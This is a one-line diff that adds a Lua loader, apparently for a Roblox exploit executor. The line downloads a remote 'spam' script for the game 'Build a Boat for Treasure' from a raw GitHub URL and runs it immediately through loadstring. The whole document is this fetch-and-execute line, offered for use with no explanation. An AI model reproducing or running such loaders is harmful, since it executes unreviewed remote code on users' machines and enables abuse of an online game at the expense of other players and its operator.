@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/build-a-boat-for-treasure-spam5-t5951n81hfcwjl.lua"))()
